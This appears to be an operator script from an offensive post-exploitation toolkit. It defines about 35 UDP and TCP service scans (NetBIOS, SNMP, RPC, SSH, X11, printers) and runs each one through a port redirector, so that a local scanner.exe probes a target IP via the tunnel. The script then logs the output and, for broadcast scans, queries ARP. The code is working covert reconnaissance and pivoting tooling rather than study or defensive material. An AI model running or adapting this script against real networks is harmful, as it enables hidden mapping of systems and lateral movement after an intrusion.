
import sys
import dsz.lp, dsz.cmd
from ops.pprint import pprint
scans = []
scans.append({'type': 'winl', 'description': 'Scan for windows boxes', 'protocol': 'UDP', 'port': '137', 'broadcast': True})
scans.append({'type': 'winn', 'description': 'Scan for windows names', 'protocol': 'UDP', 'port': '137', 'broadcast': False})
scans.append({'type': 'xwin', 'description': 'Scan for Xwin folks', 'protocol': 'UDP', 'port': '177', 'broadcast': False})
scans.append({'type': 'time', 'description': 'Scan for NTP  folks', 'protocol': 'UDP', 'port': '123', 'broadcast': False})
scans.append({'type': 'rpc', 'description': 'Scan for RPC  folks', 'protocol': 'UDP', 'port': '111', 'broadcast': False})
scans.append({'type': 'snmp1', 'description': 'Scan for SNMP version', 'protocol': 'UDP', 'port': '161', 'broadcast': False})
scans.append({'type': 'snmp2', 'description': 'Scan for Sol  version', 'protocol': 'UDP', 'port': '161', 'broadcast': False})
scans.append({'type': 'echo', 'description': 'Scan for echo hosts', 'protocol': 'UDP', 'port': '7', 'broadcast': False})
scans.append({'type': 'time2', 'description': 'Scan for daytime hosts', 'protocol': 'UDP', 'port': '13', 'broadcast': False})
scans.append({'type': 'tftp', 'description': 'Scan for tftp hosts', 'protocol': 'UDP', 'port': '69', 'broadcast': False})
scans.append({'type': 'tday', 'description': 'Scan for daytime hosts', 'protocol': 'TCP', 'port': '13', 'broadcast': False})
scans.append({'type': 'ident', 'description': 'Scan ident', 'protocol': 'TCP', 'port': '113', 'broadcast': False})
scans.append({'type': 'mail', 'description': 'Scan mail', 'protocol': 'TCP', 'port': '25', 'broadcast': False})
scans.append({'type': 'ftp', 'description': 'Scan ftp', 'protocol': 'TCP', 'port': '21', 'broadcast': False})
scans.append({'type': 't_basic', 'description': 'Scan TCP port', 'protocol': 'TCP', 'port': '0', 'broadcast': False})
scans.append({'type': 'http', 'description': 'Scan web', 'protocol': 'TCP', 'port': '80', 'broadcast': False})
scans.append({'type': 'netbios', 'description': 'Does not work', 'protocol': 'UDP', 'port': '138', 'broadcast': False})
scans.append({'type': 'dns', 'description': 'Scan for DNS', 'protocol': 'UDP', 'port': '53', 'broadcast': False})
scans.append({'type': 'ripv1', 'description': 'Scan for RIP v1', 'protocol': 'UDP', 'port': '520', 'broadcast': False})
scans.append({'type': 'ripv2', 'description': 'Scan for RIP v2', 'protocol': 'UDP', 'port': '520', 'broadcast': False})
scans.append({'type': 'lpr', 'description': 'Scan for lpr', 'protocol': 'TCP', 'port': '515', 'broadcast': False})
scans.append({'type': 'miniserv', 'description': 'Scan for Redflag Web', 'protocol': 'UDP', 'port': '10000', 'broadcast': False})
scans.append({'type': 'win_scan', 'description': 'Get windows version', 'protocol': 'TCP', 'port': '139', 'broadcast': False})
scans.append({'type': 'telnet', 'description': 'Banner Telnet', 'protocol': 'TCP', 'port': '23', 'broadcast': False})
scans.append({'type': 'finger', 'description': 'Banner finger', 'protocol': 'TCP', 'port': '79', 'broadcast': False})
scans.append({'type': 'ssl', 'description': 'Scan for SSL stuff', 'protocol': 'TCP', 'port': '443', 'broadcast': False})
scans.append({'type': 'ssh', 'description': 'Scan for SSH version', 'protocol': 'TCP', 'port': '22', 'broadcast': False})
scans.append({'type': 'snmp3', 'description': 'Finnish Test Case SNMP', 'protocol': 'UDP', 'port': '161', 'broadcast': False})
scans.append({'type': 'dtuname', 'description': 'DT uname test', 'protocol': 'TCP', 'port': '6112', 'broadcast': False})
scans.append({'type': 'answer', 'description': 'Answerbook test', 'protocol': 'TCP', 'port': '8888', 'broadcast': False})
scans.append({'type': 'brpc', 'description': 'Larger RPC dump', 'protocol': 'UDP', 'port': '111', 'broadcast': False})
scans.append({'type': 'x11', 'description': 'X11 test', 'protocol': 'TCP', 'port': '6000', 'broadcast': False})
scans.append({'type': 'xfont', 'description': 'X font server test', 'protocol': 'TCP', 'port': '7100', 'broadcast': False})
scans.append({'type': 'printer', 'description': 'Printer Test', 'protocol': 'TCP', 'port': '9100', 'broadcast': False})
scans.append({'type': 'printerid', 'description': '', 'protocol': 'TCP', 'port': '9100', 'broadcast': False})

def main(arguments):
    if (len(arguments) != 2):
        dsz.ui.Echo('Usage: scan <type> <target>', dsz.ERROR)
        printscans()
        return 0
    resdir = dsz.lp.GetResourcesDirectory()
    type = arguments[0]
    target = arguments[1]
    ourscan = None
    for item in scans:
        if (type == item['type']):
            ourscan = item
            break
    if (ourscan is None):
        dsz.ui.Echo('You must enter a valid scan type', dsz.ERROR)
        printscans()
        return 0
    if (not checkip(target)):
        dsz.ui.Echo('You must enter a valid IP address', dsz.ERROR)
        return 0
    cmd = ('redirect -%s -lplisten %s -target %s %s' % (ourscan['protocol'], ourscan['port'], target, ourscan['port']))
    (succ, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if (not succ):
        dsz.ui.Echo(('Unable to set up redirector (redirect -%s -lplisten %s -target %s %s)' % (ourscan['protocol'], ourscan['port'], target, ourscan['port'])), dsz.ERROR)
        return 0
    dsz.ui.Echo(('%s (%s scan) on %s (using %s port %s)' % (ourscan['description'], ourscan['type'], target, ourscan['protocol'], ourscan['port'])))
    PATH_TO_SCANNER = ('%s\\Ops\\Tools\\scanner.exe' % resdir)
    cmd = ('log local run -command "%s %s 127.0.0.1" -redirect scan-%s-%s' % (PATH_TO_SCANNER, ourscan['type'], target, ourscan['type']))
    (scansucc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if (not scansucc):
        dsz.ui.Echo('Scanner failed', dsz.ERROR)
    cmd = ('stop redirect -contains "%s -lplisten %s -target %s %s"' % (ourscan['protocol'], ourscan['port'], target, ourscan['port']))
    (succ, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if (not succ):
        dsz.ui.Echo('Unable to stop redirector', dsz.ERROR)
    if (scansucc and ourscan['broadcast']):
        cmd = 'arp -query'
        (scansucc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        if (not scansucc):
            dsz.ui.Echo('Arp failed', dsz.ERROR)

def printscans():
    pprint(scans, ['Type', 'Description', 'Protocol', 'Port', 'Broadcast'], ['type', 'description', 'protocol', 'port', 'broadcast'])

def checkip(ipstring):
    try:
        ipsplit = ipstring.split('.')
        if (len(ipsplit) != 4):
            return False
        for oct in ipsplit:
            if ((int(oct) > 255) or (int(oct) < 0)):
                return False
    except:
        return False
    return True
if (__name__ == '__main__'):
    try:
        main(sys.argv[1:])
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)